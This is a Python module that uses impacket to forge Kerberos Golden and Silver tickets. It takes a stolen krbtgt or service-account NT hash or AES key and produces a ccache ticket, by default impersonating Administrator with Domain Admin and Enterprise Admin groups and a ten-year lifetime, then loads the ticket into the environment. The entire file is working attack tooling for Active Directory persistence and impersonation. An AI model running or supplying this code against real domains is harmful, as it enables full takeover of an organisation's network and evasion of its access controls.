"""Ticket forging — Golden and Silver Kerberos tickets via impacket.

Golden ticket: forge a TGT signed with the krbtgt NT hash / AES key.
Silver ticket: forge a service ticket signed with a service account's hash.

Both techniques allow impersonating any user to services in the domain.
References:
  https://attack.mitre.org/techniques/T1558/001/  (Golden)
  https://attack.mitre.org/techniques/T1558/002/  (Silver)
"""

from __future__ import annotations

import logging
import os
import struct
from dataclasses import dataclass
from pathlib import Path

log = logging.getLogger(__name__)


@dataclass
class ForgedTicket:
    ticket_type: str     # "golden" or "silver"
    username:    str
    domain:      str
    ccache_path: str
    spn:         str = ""


def forge_golden(
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,       # NT hash of krbtgt account
    username: str = "Administrator",
    user_id: int = 500,
    groups: list[int] | None = None,
    *,
    aes_key: str = "",
    output_path: str | None = None,
) -> ForgedTicket:
    """Forge a Golden Ticket (TGT) and save it as a ccache file.

    Args:
        domain:       FQDN of the target domain
        domain_sid:   Domain SID (S-1-5-21-...)
        krbtgt_hash:  NT hash of the krbtgt account
        username:     Impersonated username
        user_id:      RID of the impersonated user (500 = Administrator)
        groups:       Group RIDs to include (defaults to DA/EA standard set)
        aes_key:      AES-256 krbtgt key (use instead of NT hash if available)
        output_path:  Where to write the .ccache (default: <username>.ccache)

    Returns ForgedTicket with the ccache path.
    """
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.ccache import CCache
    from impacket.krb5 import constants, crypto
    from impacket.krb5.asn1 import TGT, EncryptedData, Ticket
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.pac import PACTYPE, VALIDATION_INFO
    from impacket.examples.ticketer import TICKETER

    if groups is None:
        groups = [512, 513, 518, 519, 520]  # DA, DU, SA, EA, GPO Creators

    out = output_path or f"{username}.ccache"

    lm = ""
    nt = krbtgt_hash if not aes_key else ""

    ticketer = TICKETER(
        target=username,
        password="",
        domain=domain,
        options=_golden_options(
            domain_sid=domain_sid,
            nthash=nt,
            aesKey=aes_key,
            userId=user_id,
            groups=groups,
            ticketFile=out,
        ),
    )
    ticketer.run()

    return ForgedTicket(
        ticket_type="golden",
        username=username,
        domain=domain,
        ccache_path=out,
    )


def forge_silver(
    domain: str,
    domain_sid: str,
    service_hash: str,
    spn: str,
    username: str = "Administrator",
    user_id: int = 500,
    groups: list[int] | None = None,
    *,
    aes_key: str = "",
    output_path: str | None = None,
) -> ForgedTicket:
    """Forge a Silver Ticket (TGS) for a specific SPN and save as ccache.

    Args:
        domain:       FQDN of the target domain
        domain_sid:   Domain SID
        service_hash: NT hash of the target service account
        spn:          Target SPN (e.g. cifs/dc01.ellingson.com)
        username:     Impersonated username
        user_id:      RID of the impersonated user
        groups:       Group RIDs to include
        aes_key:      AES key of the service account (if available)
        output_path:  ccache output path

    Returns ForgedTicket with the ccache path.
    """
    from impacket.examples.ticketer import TICKETER

    if groups is None:
        groups = [512, 513, 518, 519, 520]

    out = output_path or f"{username}_{spn.replace('/', '_')}.ccache"
    nt  = service_hash if not aes_key else ""

    ticketer = TICKETER(
        target=username,
        password="",
        domain=domain,
        options=_silver_options(
            domain_sid=domain_sid,
            nthash=nt,
            aesKey=aes_key,
            userId=user_id,
            groups=groups,
            spn=spn,
            ticketFile=out,
        ),
    )
    ticketer.run()

    return ForgedTicket(
        ticket_type="silver",
        username=username,
        domain=domain,
        ccache_path=out,
        spn=spn,
    )


def load_ccache(path: str) -> None:
    """Set KRB5CCNAME to point at the given ccache file."""
    os.environ["KRB5CCNAME"] = str(Path(path).resolve())


# ── impacket options shim ─────────────────────────────────────────────────────

class _Opts:
    """Minimal options namespace that impacket's TICKETER expects."""
    def __init__(self, **kwargs):
        for k, v in kwargs.items():
            setattr(self, k, v)


def _golden_options(**kw) -> _Opts:
    return _Opts(
        nthash=kw.get("nthash", ""),
        aesKey=kw.get("aesKey", ""),
        domain_sid=kw.get("domain_sid", ""),
        userId=kw.get("userId", 500),
        groups=kw.get("groups", [512, 513, 518, 519, 520]),
        ticketFile=kw.get("ticketFile", "output.ccache"),
        # Silver-specific — empty for golden
        spn=None,
        dc_ip=None,
        extra_pac=False,
        old_pac=False,
        duration=3650,
        ts_period=0,
        extra_sid="",
        forest="",
        user_dn="",
        request=False,
        domain="",
        password="",
        hashes=None,
        k=False,
        no_pass=False,
        aes=False,
        ldap_filter=None,
        targetUser=None,
        dc_host=None,
    )


def _silver_options(**kw) -> _Opts:
    opts = _golden_options(**kw)
    opts.spn = kw.get("spn", "")
    return opts
